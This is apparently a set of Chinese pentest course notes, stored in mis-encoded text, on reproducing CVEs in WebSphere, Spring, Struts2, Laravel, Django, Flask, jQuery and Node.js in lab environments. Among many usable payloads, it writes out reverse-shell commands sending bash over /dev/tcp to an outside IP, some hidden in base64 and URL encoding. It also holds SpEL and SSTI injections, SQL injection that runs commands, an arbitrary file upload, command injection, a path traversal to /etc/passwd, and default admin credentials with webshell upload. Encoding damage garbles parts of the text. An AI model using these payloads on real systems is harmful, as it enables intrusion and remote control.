<p>ä¸­é—´ä»¶-WebSphere-æœå“ˆ<br>WebSphere@Application ServeråŠ é€Ÿäº¤ä»˜æ–°åº”ç”¨ç¨‹åºå’ŒæœåŠ¡ï¼Œå®ƒå¯ä»¥é€šè¿‡å¿«é€Ÿäº¤ä»˜åˆ›æ–°<br>çš„åº”ç”¨ç¨‹åºæ¥å¸®åŠ©ä¼ä¸šæä¾›ä¸°å¯Œçš„ç”¨æˆ·ä½“éªŒä»åŸºäºå¼€æ”¾æ ‡å‡†çš„ä¸°å¯Œçš„ç¼–ç¨‹æ¨¡å‹ä¸­è¿›è¡Œé€‰<br>æ‹©ï¼Œä»¥ä¾¿æ›´å¥½åœ°åè°ƒé¡¹ç›®éœ€æ±‚ä¸ç¼–ç¨‹æ¨¡å‹åŠŸèƒ½å’Œå¼€å‘äººå‘˜æŠ€èƒ½ã€‚<br>ç«¯å£ï¼š9080ä¸€web(http)åº”ç”¨è®¿é—®ç«¯å£ã€9443-web(https)åº”ç”¨è®¿ié—®ç«¯å£ã€9060ä¸€ç®¡ç†åå°<br>è®¿é—®ç«¯å£ã€9043ä¸€ç®¡ç†æ§åˆ¶å°å®‰å…¨ç«¯å£ã€8880ä¸€SOAPè¿æ¥å™¨ç«¯å£ç­‰ç­‰ã€‚<br>æ¼æ´æ¢æµ‹åœ¨8880æ»¡å£ï¼Œåå°æ˜¯9060ç«¯å£ï¼Œè§£ææ˜¯9080ç«¯å£<br>æ‹‰å–é•œåƒï¼šdocker pull iscrosales&#x2F;websphere7<br>å¯åŠ¨é•œåƒï¼šdocker run-d-p9060:9060-p9043:9043-p8880:8880-p9080:9080<br>iscrosales&#x2F;websphere7<br>åœæ­¢é•œåƒï¼šdocker stop $(docker ps-aq)<br>1ã€CVE-2015-7450ååºåˆ—åŒ–<br>å·¥å…·æœå“ˆï¼š<a href="http://147.94.236.117:8880/">http://147.94.236.117:8880/</a><br>2ã€å¼±â˜ä»¤ä¸Šä¼ æ‹¿Shell<br>-åœ¨6xè‡³7.0ç‰ˆæœ¬ï¼Œåå°ç™»é™†åªéœ€è¦è¾“å…¥adminä½œä¸ºç”¨æˆ·æ ‡è¯†ï¼Œæ— éœ€å¯†ç ï¼Œå³å¯ç™»é™†åå°ã€‚<br>-websphere&#x2F;websphere<br>-system&#x2F;manager<br>è®¿ié—®ï¼šhttp:147.94.236.117:9060&#x2F;<br>ç™»å½•ï¼šadmin<br>ä¸Šä¼ ï¼šwaré©¬<br>å¯åŠ¨ï¼š1_war<br>è¿æ¥ï¼š<a href="http://47.94.236.117:9080/1/1jsp">http://47.94.236.117:9080/1/1jsp</a><br>3ã€CVE-2020-4450:æ— åˆ©ç”¨P0C&#x2F;EXP</p>
<h1 id="ç¬¬62å¤©-æœåŠ¡æ”»é˜²-æ¡†æ¶å®‰å…¨-CVEå¤ç°-Spring-Struts-Laravela-ThinkPHP"><a href="#ç¬¬62å¤©-æœåŠ¡æ”»é˜²-æ¡†æ¶å®‰å…¨-CVEå¤ç°-Spring-Struts-Laravela-ThinkPHP" class="headerlink" title="ç¬¬62å¤© æœåŠ¡æ”»é˜²-æ¡†æ¶å®‰å…¨&amp;CVEå¤ç°&amp;Spring&amp;Struts&amp;Laravela&amp;ThinkPHP"></a>ç¬¬62å¤© æœåŠ¡æ”»é˜²-æ¡†æ¶å®‰å…¨&amp;CVEå¤ç°&amp;Spring&amp;Struts&amp;Laravela&amp;ThinkPHP</h1><h4 id="çŸ¥è¯†ç‚¹ï¼š-42"><a href="#çŸ¥è¯†ç‚¹ï¼š-42" class="headerlink" title="çŸ¥è¯†ç‚¹ï¼š"></a>çŸ¥è¯†ç‚¹ï¼š</h4><p>ä¸­é—´ä»¶åŠæ¡†æ¶åˆ—è¡¨ï¼š<br>IIS,Apache,Nginx,Tomcat,Docker,K8s,Weblogic.JBoos,WebSphere,<br>Jenkins,GlassFish,Jetty,Jira,Struts2,Laravel,Solr,Shiro,Thinkphp,Spring,<br>Flask,jQueryç­‰<br>1ã€å¼€å‘æ¡†æ¶-PHP-Laravel-Thinkphp<br>2ã€å¼€å‘æ¡†æ¶-Javaweb-St2-Spring<br>3.å¼€å‘æ¡†æ¶-Python-django-Flask<br>4ã€å¼€å‘æ¡†æ¶-Javascript-Node.js-JQuery</p>
<h4 id="å¸¸è§è¯­è¨€å¼€å‘æ¡†æ¶ï¼š"><a href="#å¸¸è§è¯­è¨€å¼€å‘æ¡†æ¶ï¼š" class="headerlink" title="å¸¸è§è¯­è¨€å¼€å‘æ¡†æ¶ï¼š"></a>å¸¸è§è¯­è¨€å¼€å‘æ¡†æ¶ï¼š</h4><p>PHP:Thinkphp Laravel YIl Codelgniter CakePHP Zend<br>JAVA:Spring MyBatis Hibernate Struts2 Springboot<br>Python:Django Flask Bottle Turbobars Tornado Web2py<br>Javascript:Vue.js Node.js Bootstrap JQuery Angular</p>
<h4 id="ç« èŠ‚å†…å®¹ï¼š-8"><a href="#ç« èŠ‚å†…å®¹ï¼š-8" class="headerlink" title="ç« èŠ‚å†…å®¹ï¼š"></a>ç« èŠ‚å†…å®¹ï¼š</h4><p>å¸¸è§ä¸­é—´ä»¶çš„å®‰å…¨æµ‹è¯•ï¼š<br>1ã€é…ç½®ä¸å½“-è§£æ&amp;å¼±å£ä»¤<br>2ã€å®‰å…¨æœºåˆ¶ç‰¹å®šå®‰å…¨æ¼æ´<br>3ã€å®‰å…¨æœºåˆ¶å¼±å£ä»¤çˆ†ç ´æ”»å‡»<br>4ã€å®‰å…¨åº”ç”¨-æ¡†æ¶ç‰¹å®šå®‰å…¨æ¼æ´</p>
<h4 id="å‰ç½®çŸ¥è¯†ï¼š-11"><a href="#å‰ç½®çŸ¥è¯†ï¼š-11" class="headerlink" title="å‰ç½®çŸ¥è¯†ï¼š"></a>å‰ç½®çŸ¥è¯†ï¼š</h4><p>,ä¸­é—´ä»¶å®‰å…¨æµ‹è¯•æµç¨‹ï¼š<br>1ã€åˆ¤æ–­ä¸­é—´ä»¶ä¿¡æ¯åç§°&amp;ç‰ˆæœ¬&amp;ä¸‰æ–¹<br>2ã€åˆ¤æ–­ä¸­é—´ä»¶é—®é¢˜-é…ç½®ä¸å½“&amp;å…¬å¼€æ¼æ´<br>3ã€åˆ¤æ–­ä¸­é—´ä»¶åˆ©ç”¨-å¼±å£ä»¤&amp;EXP&amp;æ¡†æ¶æ¼æ´</p>
<p>åº”ç”¨æœåŠ¡å®‰å…¨æµ‹è¯•æµç¨‹ï¼šè§å›¾<br>1ã€åˆ¤æ–­æœåŠ¡å¼€æ”¾æƒ…å†µ-ç«¯å£æ‰«æ&amp;ç»„åˆåº”ç”¨ç­‰<br>2ã€åˆ¤æ–­æœåŠ¡ç±»å‹å½’å±æ•°æ®åº“&amp;æ–‡ä»¶ä¼ è¾“&amp;é€šè®¯ç­‰<br>3ã€åˆ¤æ–­æœåŠ¡åˆ©ç”¨æ–¹å¼ç‰¹å®šæ¼æ´&amp;æœªæˆæƒ&amp;å¼±å£ä»¤ç­‰</p>
<p>å¼€å‘æ¡†æ¶ç»„ä»¶å®‰å…¨æµ‹è¯•æµç¨‹ï¼š<br>1ã€åˆ¤æ–­å¸¸è§è¯­è¨€å¼€å‘æ¡†æ¶ç±»å‹<br>2ã€åˆ¤æ–­å¼€å‘æ¡†æ¶å­˜åœ¨çš„CVEé—®é¢˜<br>3ã€åˆ¤æ–­å¼€å‘æ¡†æ¶CVEæ¼æ´åˆ©ç”¨æ–¹å¼</p>
<h4 id="æ¼”ç¤ºæ¡ˆä¾‹ï¼š-36"><a href="#æ¼”ç¤ºæ¡ˆä¾‹ï¼š-36" class="headerlink" title="æ¼”ç¤ºæ¡ˆä¾‹ï¼š"></a>æ¼”ç¤ºæ¡ˆä¾‹ï¼š</h4><p>PHP-å¼€å‘æ¡†æ¶å®‰å…¨-Thinkphp&amp;Laravel<br>JAVAWEB-å¼€å‘æ¡†æ¶å®‰å…¨-Spring&amp;Struts2</p>
<h5 id="PHP-å¼€å‘æ¡†æ¶å®‰å…¨-Thinkphp-Laravel"><a href="#PHP-å¼€å‘æ¡†æ¶å®‰å…¨-Thinkphp-Laravel" class="headerlink" title="PHP-å¼€å‘æ¡†æ¶å®‰å…¨-Thinkphp&amp;Laravel"></a>PHP-å¼€å‘æ¡†æ¶å®‰å…¨-Thinkphp&amp;Laravel</h5><p>-Laravelæ˜¯ä¸€å¥—ç®€æ´ã€ä¼˜é›…çš„PHP Webå¼€å‘æ¡†æ¶PHP Web Framework).<br>CVE-2021-3129RCE<br>Laravel &lt;8.4.2<br><a href="https://github.com/zhzyker/CVE-2021-3129">https://github.com/zhzyker/CVE-2021-3129</a><br><a href="https://github.com/SecPros-Team/laravel-CVE-2021-3129-EXP">https://github.com/SecPros-Team/laravel-CVE-2021-3129-EXP</a><br>æ¼æ´å¤ç°ï¼š<br>ä½¿ç”¨expä¸€æ­¥Thinkphp-3.X RCE-5.X RCE è„šæœ¬å°å­ä¸Šçº¿<br>ThinkPHPæ˜¯ä¸€å¥—å¼€æºçš„ã€åŸºäºPHPçš„è½»é‡çº§Webåº”ç”¨å¼€å‘æ¡†æ¶<br>æ­¦å™¨åº“-Thinkphpä¸“æ£€å†™å…¥shellï¼Œä½¿ç”¨å“¥æ–¯æ‹‰è¿æ¥</p>
<h5 id="JAVAWEB-å¼€å‘æ¡†æ¶å®‰å…¨-Spring-Struts2"><a href="#JAVAWEB-å¼€å‘æ¡†æ¶å®‰å…¨-Spring-Struts2" class="headerlink" title="JAVAWEB-å¼€å‘æ¡†æ¶å®‰å…¨-Spring&amp;Struts2"></a>JAVAWEB-å¼€å‘æ¡†æ¶å®‰å…¨-Spring&amp;Struts2</h5><p>Struts:2æ˜¯ä¸€ä¸ªåŸºäºMvCè®¾è®¡æ¨¡å¼çš„Webåº”ç”¨æ¡†æ¶</p>
<h6 id="1ã€2020å‰æ¼æ´-å¤ç°"><a href="#1ã€2020å‰æ¼æ´-å¤ç°" class="headerlink" title="1ã€2020å‰æ¼æ´ å¤ç°"></a>1ã€2020å‰æ¼æ´ å¤ç°</h6><p>æ­¦å™¨åº“-S2ä¸“æ£€</p>
<h6 id="2ã€cve-2020-17530-å¤ç°"><a href="#2ã€cve-2020-17530-å¤ç°" class="headerlink" title="2ã€cve_2020_17530 å¤ç°"></a>2ã€cve_2020_17530 å¤ç°</h6><p>è„šæœ¬ï¼š<a href="https://github.com/YanMu.2020/s2-062">https://github.com/YanMu.2020/s2-062</a><br>æ‰‹å·¥ï¼š</p>
<h6 id="3ã€cve2021-31805"><a href="#3ã€cve2021-31805" class="headerlink" title="3ã€cve2021_31805"></a>3ã€cve2021_31805</h6><p><a href="https://github.com/YanMu2020/s2-062">https://github.com/YanMu2020/s2-062</a></p>
<h5 id="Springæ¡†æ¶æ˜¯ç”±äºè½¯ä»¶å¼€å‘å§‹çš„å¤æ‚æ€§è€Œåˆ›å»ºçš„ã€‚"><a href="#Springæ¡†æ¶æ˜¯ç”±äºè½¯ä»¶å¼€å‘å§‹çš„å¤æ‚æ€§è€Œåˆ›å»ºçš„ã€‚" class="headerlink" title="Springæ¡†æ¶æ˜¯ç”±äºè½¯ä»¶å¼€å‘å§‹çš„å¤æ‚æ€§è€Œåˆ›å»ºçš„ã€‚"></a>Springæ¡†æ¶æ˜¯ç”±äºè½¯ä»¶å¼€å‘å§‹çš„å¤æ‚æ€§è€Œåˆ›å»ºçš„ã€‚</h5><h6 id="1-cve-2017-4971-Spring-Web-Flow-vulfocus"><a href="#1-cve-2017-4971-Spring-Web-Flow-vulfocus" class="headerlink" title="1,cve_2017_4971-Spring Web Flow vulfocus"></a>1,cve_2017_4971-Spring Web Flow vulfocus</h6><p>Spring WebFlow 2.4.0-2.4.4<br><a href="https://paper.seebug.org/322/">https://paper.seebug.org/322/</a><br>_eventld_confirm&#x3D;&amp;csrf&#x3D;e06e1d86-e083-45f7-<br>b700-567b5f7f5d30&amp;(new+java.lang.ProcessBuilder(â€œbashâ€,â€œ-câ€,â€bashÂ±<br>i+&gt;%26+&#x2F;dev&#x2F;tcp&#x2F;47.94.236.117&#x2F;5566+0&gt;%261).stat0&#x3D;vulhub</p>
<h6 id="2-cve-2018-1273-Spring-Data-Commons-vulfocus"><a href="#2-cve-2018-1273-Spring-Data-Commons-vulfocus" class="headerlink" title="2.cve_2018_1273-Spring Data Commons vulfocus"></a>2.cve_2018_1273-Spring Data Commons vulfocus</h6><p>Spring Data Commons 1.13-1.13.10 (Ingalls SR10)<br>Spring Data REST 2.6-2.6.10(Ingalls SR10)<br>Spring Data Commons 2.0 to 2.0.5 (Kay SR5<br>Spring Data REST 3.0-3.0.5(Kay SR5ï¼‰<br>bash-c<br>fecho.YmFzaCAtaSA+JiAvZGV2L3RicC80Ny45NC4yMzYuMTE3LZU1NjYgMD4mMQ&#x3D;&#x3D;<br>base64,-d bash,-i)<br>username#this getclassï¼ˆï¼‰.forName(â€œjava lang.Runtimeâ€).getRuntime(.exec(â€œ%62%61%<br>73%68%20%2d%63%20%7b%65%63%68%6f%2c%59%6d%46%7a%61%43%41%74<br>%61%53%41%2b%4a%69%41%76%5a%47%56%32%4c%33%52%6a%63%43%38%3<br>0%4e%79%34%35%4e%43%34%79%4d%7a%59%75%4d%54%45%33%4c%7a%55%<br>31%4e%6a%59%67%4d%44%34%6d%4d%51%3d%3d%7d%7c%7b%62%61%73%65<br>%36%34%2c%2d%64%7d%7c%7b%62%61%73%68%2c%2d%69%7dâ€]&#x3D;&amp;passw0rd&#x3D;&amp;<br>repeatedPassword&#x3D;</p>
<h6 id="3ã€CVE-2022-22963-Spring-Cloud-Function-Spelè¡¨è¾¾å¼æ³¨å…¥-vulhub"><a href="#3ã€CVE-2022-22963-Spring-Cloud-Function-Spelè¡¨è¾¾å¼æ³¨å…¥-vulhub" class="headerlink" title="3ã€CVE-2022-22963 Spring Cloud Function Spelè¡¨è¾¾å¼æ³¨å…¥ vulhub"></a>3ã€CVE-2022-22963 Spring Cloud Function Spelè¡¨è¾¾å¼æ³¨å…¥ vulhub</h6><p>Spring Cloud Functionæä¾›äº†ä¸€ä¸ªé€šç”¨çš„æ¨¡å‹ï¼Œç”¨äºåœ¨å†¬ç§å¹³å°ä¸Šéƒ¨ç½²åŸºäºå‡½æ•°çš„è½¯ä»¶ï¼Œ<br>åŒ…æ‹¬åƒAmazon AWS Lambdaè¿™æ ·çš„FaaS(å‡½æ•°å³æœåŠ¡ï¼Œfunction as a service)å¹³å°ã€‚<br>Connection:close<br>spring cloud.function.routing-expression:T(java.lang.Runtime).getRuntime(.exec(â€œbash-<br>(echo,YmFzaCAtaSA+JiAVZGV2L3RjcC80Ny45NC4yMzYuMTE3LZU1NjYgMD4mMQ&#x3D;&#x3D;)<br>Kbase64.-d)(bash,-i)â€)</p>
<h1 id="ç¬¬å…­åä¸‰å¤©-æœåŠ¡æ”»é˜²-æ¡†æ¶å®‰å…¨-CVEå¤ç°-Django-Flask-Node-JS-JQuery"><a href="#ç¬¬å…­åä¸‰å¤©-æœåŠ¡æ”»é˜²-æ¡†æ¶å®‰å…¨-CVEå¤ç°-Django-Flask-Node-JS-JQuery" class="headerlink" title="ç¬¬å…­åä¸‰å¤© æœåŠ¡æ”»é˜²-æ¡†æ¶å®‰å…¨&amp;CVEå¤ç°&amp;Django&amp;Flask&amp;Node.JS&amp;JQuery"></a>ç¬¬å…­åä¸‰å¤© æœåŠ¡æ”»é˜²-æ¡†æ¶å®‰å…¨&amp;CVEå¤ç°&amp;Django&amp;Flask&amp;Node.JS&amp;JQuery</h1><h4 id="ä¸­é—´ä»¶åŠæ¡†æ¶åˆ—è¡¨ï¼š"><a href="#ä¸­é—´ä»¶åŠæ¡†æ¶åˆ—è¡¨ï¼š" class="headerlink" title="ä¸­é—´ä»¶åŠæ¡†æ¶åˆ—è¡¨ï¼š"></a>ä¸­é—´ä»¶åŠæ¡†æ¶åˆ—è¡¨ï¼š</h4><p>IIS,Apache,Nginx,Tomcat,Docker,K8s,Weblogic.JBoos,WebSphere,<br>Jenkins,GlassFish,Jetty,Jira,Struts2,Laravel,Solr,Shiro,Thinkphp,Spring,<br>Flask,jQueryç­‰<br>1ã€å¼€å‘æ¡†æ¶-PHP-Laravel-Thinkphp<br>2ã€å¼€å‘æ¡†æ¶-Javaweb-St2-Spring<br>3.å¼€å‘æ¡†æ¶-Python-django-Flask<br>4ã€å¼€å‘æ¡†æ¶-Javascript-Node.js-JQuery<br>5ã€å…¶ä»–æ¡†æ¶Java-Apache Shiro&amp;Apache Sorl</p>
<h4 id="å¸¸è§è¯­è¨€å¼€å‘æ¡†æ¶ï¼š-1"><a href="#å¸¸è§è¯­è¨€å¼€å‘æ¡†æ¶ï¼š-1" class="headerlink" title="å¸¸è§è¯­è¨€å¼€å‘æ¡†æ¶ï¼š"></a>å¸¸è§è¯­è¨€å¼€å‘æ¡†æ¶ï¼š</h4><p>PHP:Thinkphp Laravel YIl Codelgniter CakePHP Zend<br>JAVA:Spring MyBatis Hibernate Struts2 Springboot<br>Python:Django Flask Bottle Turbobars Tornado Web2py<br>Javascript:Vue.js Node.js Bootstrap JQuery Angular</p>
<h4 id="ç« èŠ‚å†…å®¹ï¼š-9"><a href="#ç« èŠ‚å†…å®¹ï¼š-9" class="headerlink" title="ç« èŠ‚å†…å®¹ï¼š"></a>ç« èŠ‚å†…å®¹ï¼š</h4><p>å¸¸è§ä¸­é—´ä»¶çš„å®‰å…¨æµ‹è¯•ï¼š<br>1ã€é…ç½®ä¸å½“-è§£æ&amp;å¼±å£ä»¤<br>2ã€å®‰å…¨æœºåˆ¶ç‰¹å®šå®‰å…¨æ¼æ´<br>3ã€å®‰å…¨æœºåˆ¶å¼±å£ä»¤çˆ†ç ´æ”»å‡»<br>4ã€å®‰å…¨åº”ç”¨-æ¡†æ¶ç‰¹å®šå®‰å…¨æ¼æ´</p>
<h4 id="å‰ç½®çŸ¥è¯†ï¼š-12"><a href="#å‰ç½®çŸ¥è¯†ï¼š-12" class="headerlink" title="å‰ç½®çŸ¥è¯†ï¼š"></a>å‰ç½®çŸ¥è¯†ï¼š</h4><p>ä¸­é—´ä»¶å®‰å…¨æµ‹è¯•æµç¨‹ï¼š<br>1ã€åˆ¤æ–­ä¸­é—´ä»¶ä¿¡æ¯åç§°&amp;ç‰ˆæœ¬&amp;ä¸‰æ–¹<br>2ã€åˆ¤æ–­ä¸­é—´ä»¶é—®é¢˜-é…ç½®ä¸å½“&amp;å…¬å¼€æ¼æ´<br>3ã€åˆ¤æ–­ä¸­é—´ä»¶åˆ©ç”¨-å¼±å£ä»¤&amp;EXP&amp;æ¡†æ¶æ¼æ´</p>
<h5 id="åº”ç”¨æœåŠ¡å®‰å…¨æµ‹è¯•æµç¨‹ï¼šè§å›¾"><a href="#åº”ç”¨æœåŠ¡å®‰å…¨æµ‹è¯•æµç¨‹ï¼šè§å›¾" class="headerlink" title="åº”ç”¨æœåŠ¡å®‰å…¨æµ‹è¯•æµç¨‹ï¼šè§å›¾"></a>åº”ç”¨æœåŠ¡å®‰å…¨æµ‹è¯•æµç¨‹ï¼šè§å›¾</h5><p>1ã€åˆ¤æ–­æœåŠ¡å¼€æ”¾æƒ…å†µ-ç«¯å£æ‰«æ&amp;ç»„åˆåº”ç”¨ç­‰<br>2ã€åˆ¤æ–­æœåŠ¡ç±»å‹å½’å±æ•°æ®åº“&amp;æ–‡ä»¶ä¼ è¾“&amp;é€šè®¯ç­‰<br>3ã€åˆ¤æ–­æœåŠ¡åˆ©ç”¨æ–¹å¼ç‰¹å®šæ¼æ´&amp;æœªæˆæƒ&amp;å¼±å£ä»¤ç­‰</p>
<h5 id="å¼€å‘æ¡†æ¶ç»„ä»¶å®‰å…¨æµ‹è¯•æµç¨‹ï¼š"><a href="#å¼€å‘æ¡†æ¶ç»„ä»¶å®‰å…¨æµ‹è¯•æµç¨‹ï¼š" class="headerlink" title="å¼€å‘æ¡†æ¶ç»„ä»¶å®‰å…¨æµ‹è¯•æµç¨‹ï¼š"></a>å¼€å‘æ¡†æ¶ç»„ä»¶å®‰å…¨æµ‹è¯•æµç¨‹ï¼š</h5><p>1ã€åˆ¤æ–­å¸¸è§è¯­è¨€å¼€å‘æ¡†æ¶ç±»å‹<br>2ã€åˆ¤æ–­å¼€å‘æ¡†æ¶å­˜åœ¨çš„CVEé—®é¢˜<br>3ã€åˆ¤æ–­å¼€å‘æ¡†æ¶CVEæ¼æ´åˆ©ç”¨æ–¹å¼</p>
<h4 id="æ¼”ç¤ºæ¡ˆä¾‹ï¼š-37"><a href="#æ¼”ç¤ºæ¡ˆä¾‹ï¼š-37" class="headerlink" title="æ¼”ç¤ºæ¡ˆä¾‹ï¼š"></a>æ¼”ç¤ºæ¡ˆä¾‹ï¼š</h4><p>Python-å¼€å‘æ¡†æ¶å®‰å…¨-Django&amp;Flask<br>JavaScript-å¼€å‘æ¡†æ¶å®‰å…¨-Jquery&amp;Node</p>
<p>Python-å¼€å‘æ¡†æ¶å®‰å…¨-Diango&amp;Fask</p>
<h5 id="Django"><a href="#Django" class="headerlink" title="Django"></a>Django</h5><p>Djangoæ˜¯ä¸€æ¬¾å¹¿ä¸ºæµè¡Œçš„å¼€æºwebæ¡†æ¶ï¼Œç”±Pythonç¼–å†™ï¼Œè®¸å¤šç½‘ç«™å’Œappéƒ½åŸºäºDjangoå¼€<br>å‘ã€‚Djangoé‡‡ç”¨äº†MTVçš„æ¡†æ¶æ¨¡å¼ï¼Œå³æ¨¡å‹M,è§†å›¾Vå’Œæ¨¡ç‰ˆT,ä½¿ç”¨Django,ç¨‹åºå‘˜å¯ä»¥<br>æ–¹ä¾¿ã€å¿«æ·åœ°åˆ›å»ºé«˜å“è´¨ã€æ˜“ç»´æŠ¤ã€æ•°æ®åº“é©±åŠ¨çš„åº”ç”¨ç¨‹åºã€‚è€Œä¸”Djangoè¿˜åŒ…å«è®¸å¤šåŠŸèƒ½<br>å¼ºå¤§çš„ç¬¬ä¸‰æ–¹æ’ä»¶ï¼Œä½¿å¾—Django.å…·æœ‰è¾ƒå¼ºçš„å¯æ‰©å±•æ€§ã€‚<br>1ã€Cve_201914234 éœ€è¦ç™»å½•åˆ°åå°<br>è®¿é—®ä¸‹é¢çš„è·¯å¾„ï¼Œå•å¼•å·å·²æ³¨å…¥æˆåŠŸï¼ŒSQLè¯­å¥æŠ¥é”™ï¼š<br>&#x2F;admin&#x2F;vuln&#x2F;collection&#x2F;?detail_a%27b&#x3D;123<br>åˆ›å»ºcmd exec:<br>admin&#x2F;vuln&#x2F;collection&#x2F;?detail title%27)%3d%271%27%200r%201%3d1%20%3bcreate<br>%20table%20cmd_exec(cmd_output%20text)-%20<br>è°ƒç”¨cmd_execæ‰§è¡Œå‘½ä»¤ï¼š<br>&#x2F;admin&#x2F;vuln&#x2F;collection&#x2F;?detail title%27)%3d%271%27%20or%201%3d1%20%3bcopy%<br>20cmd_exec%20FROM%20PROGRAM%20%27ping hqrwsz dnslog.cn%27â€“%20<br>2ã€CVE-2021-35042 vulfocus<br>&#x2F;vuln&#x2F;?order&#x3D;vuln collection name)select%20updatexml(1,%20concat(0x7e,<br>select%20@@basedir)),1)%23<br>&#x2F;vuln&#x2F;?order&#x3D;vuln collection.name)select%20updatexml(1.%20concat(Ox7e,<br>(select%20versionï¼ˆï¼‰)).1)%23<br>æ•°iæ®åº“åï¼švuln&#x2F;?order-vuln collection.name)select%20 updatexml1,%20 concat(0x7e,<br>select%20databaseï¼ˆï¼‰).1)%23<br>3ã€CVe-2022-28346<br><a href="https://github.com/YouGina/CVE-2022-28346">https://github.com/YouGina/CVE-2022-28346</a></p>
<h5 id="Flask-Jinja2-SSTI"><a href="#Flask-Jinja2-SSTI" class="headerlink" title="Flask Jinja2 SSTI"></a>Flask Jinja2 SSTI</h5><p>Flaskæ˜¯ä¸€ä¸ªä½¿ç”¨Pythonsç¼–å†™çš„è½»é‡çº§Webåº”ç”¨æ¡†æ¶ã€‚å…¶WSGlå·¥å…·ç®±é‡‡ç”¨Verkzeug,æ¨¡<br>æ¿å¼•æ“åˆ™ä½¿ç”¨Jinja2 vulhub<br>?name&#x3D;%7B%25%20for%20c%20in%20%5B%5D.class_base_subclasses_<br>()<br>%20%25%7D%0A%7B%25%20if%20c.name %20%3D%3D%20%27catch_warning<br>s%27%20%25%7D%0A%20%20%7B%25%20for%20b%20in%20c.init__globals<br>valuesï¼ˆï¼‰</p>
<p>JavaScript-å¼€å‘æ¡†æ¶å®‰å…¨-Jquery&amp;Node</p>
<h5 id="jQuery"><a href="#jQuery" class="headerlink" title="jQuery"></a>jQuery</h5><p>1ã€cve_2018_9207cve20189208cve20189209<br>æè¿°jQueryæ˜¯ä¸€ä¸ªå¿«é€Ÿã€ç®€æ´çš„JavaScriptæ¡†æ¶ï¼Œæ˜¯ç»§Prototype,ä¹‹ååˆä¸€ä¸ªä¼˜ç§€çš„<br>JavaScriptä»£ç åº“ï¼ˆæ¡†æ¶ï¼‰äº2006å¹´1æœˆç”±John Resigå‘å¸ƒã€‚<br>jQuery Upload File&lt;&#x3D;4.0.2ä¸­çš„ä»»æ„æ–‡ä»¶ä¸Šä¼ <br>curl -F â€œmyfile&#x3D;@php.phpâ€â€œ<a href="http://123.58.236.76:56579/jquery-upload-">http://123.58.236.76:56579/jquery-upload-</a><br>file&#x2F;php&#x2F;upload.phpâ€</p>
<h5 id="Node-js"><a href="#Node-js" class="headerlink" title="Node.js"></a>Node.js</h5><p>1ã€Cve202121315 vulfocus<br>Node.js:æ˜¯ä¸€ä¸ªåŸºäºChrome V8å¼•æ“çš„JavaScriptiè¿è¡Œç¯å¢ƒï¼Œç”¨äºæ–¹ä¾¿çš„åŸ¹å»ºå“åº”é€Ÿåº¦å¿«<br>æ˜“äºæ‹“å±•çš„ç½‘ç»œåº”ç”¨ã€‚<br>Node.js-systeminformationæ˜¯ç”¨äºè·å–å„ç§ç³»ç»Ÿä¿¡æ¯çš„Node.jsæ¨¡å—åœ¨å­˜åœ¨å‘½ä»¤æ³¨å…¥æ¼åŒçš„<br>ç‰ˆæœ¬ä¸­ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡æœªè¿‡æ»¤çš„å‚æ•°ä¸­æ³¨å…¥payloadiæ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚<br>Systeminformation&lt;5.3.1<br>git clone <a href="https://github.com/ForbiddenProgrammer/CVE-2021-21315-PoC.git">https://github.com/ForbiddenProgrammer/CVE-2021-21315-PoC.git</a><br>node index.js<br>&#x2F;api&#x2F;getServices?name&#x3D;$(echo -e â€˜xiaodiâ€™&gt;test.txt)<br>2ã€cve201714849 vulfocus<br>GET:<br>&#x2F;static&#x2F;â€¦&#x2F;â€¦&#x2F;â€¦&#x2F;â€¦&#x2F;â€¦&#x2F;etc&#x2F;passwd</p>
<h1 id="ç¬¬å…­åå››å¤©-æœåŠ¡æ”»é˜²-æ¡†æ¶å®‰å…¨-CVEå¤ç°Apache-shiro-Apache-Solr"><a href="#ç¬¬å…­åå››å¤©-æœåŠ¡æ”»é˜²-æ¡†æ¶å®‰å…¨-CVEå¤ç°Apache-shiro-Apache-Solr" class="headerlink" title="ç¬¬å…­åå››å¤© æœåŠ¡æ”»é˜²-æ¡†æ¶å®‰å…¨&amp;CVEå¤ç°Apache shiro&amp;Apache Solr"></a>ç¬¬å…­åå››å¤© æœåŠ¡æ”»é˜²-æ¡†æ¶å®‰å…¨&amp;CVEå¤ç°Apache shiro&amp;Apache Solr</h1><h4 id="çŸ¥è¯†ç‚¹ï¼š-43"><a href="#çŸ¥è¯†ç‚¹ï¼š-43" class="headerlink" title="#çŸ¥è¯†ç‚¹ï¼š"></a>#çŸ¥è¯†ç‚¹ï¼š</h4><p>ä¸­é—´ä»¶åŠæ¡†æ¶åˆ—è¡¨ï¼š<br>IISï¼ŒApacheï¼ŒNginxï¼ŒTomcatï¼ŒDockerï¼ŒK8sï¼ŒWeblogicï¼ŒJBoosï¼ŒWebSphereï¼ŒJenkins ï¼ŒGlassFishï¼ŒJettyï¼ŒJiraï¼ŒStruts2ï¼ŒLaravelï¼ŒSolrï¼ŒShiroï¼ŒThinkphpï¼ŒSpringï¼ŒFlaskï¼ŒjQueryç­‰<br>1ã€å¼€å‘æ¡†æ¶-PHP-Laravel-Thinkphp<br>2ã€å¼€å‘æ¡†æ¶-Javaweb-St2-Spring<br>3ã€å¼€å‘æ¡†æ¶-Python-django-Flask<br>4ã€å¼€å‘æ¡†æ¶-Javascript-Node.js-JQuery<br>5ã€å…¶ä»–æ¡†æ¶-Java-Apache Shiro&amp;Apache Sorl</p>
<p>å¸¸è§è¯­è¨€å¼€å‘æ¡†æ¶ï¼š</p>
<p>PHPï¼šThinkphp Laravel YII CodeIgniter CakePHP Zendç­‰<br>JAVAï¼šSpring MyBatis Hibernate Struts2 Springbootç­‰<br>Pythonï¼šDjango Flask Bottle Turbobars Tornado Web2pyç­‰<br>Javascriptï¼šVue.js Node.js Bootstrap JQuery Angularç­‰</p>
